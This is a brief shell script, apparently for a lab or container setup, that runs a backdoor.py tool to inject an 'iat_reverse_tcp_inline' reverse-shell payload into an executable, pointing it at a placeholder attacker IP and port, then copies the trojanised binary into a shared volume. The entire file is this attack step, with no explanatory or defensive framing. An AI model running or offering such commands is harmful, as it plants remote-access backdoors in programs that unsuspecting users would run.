#!/bin/sh

./backdoor.py -f shared-vol/backdoor.exe -s iat_reverse_tcp_inline -H <ip> -P <port>
mv backdoored/backdoor.exe shared-vol/backdoored.exe
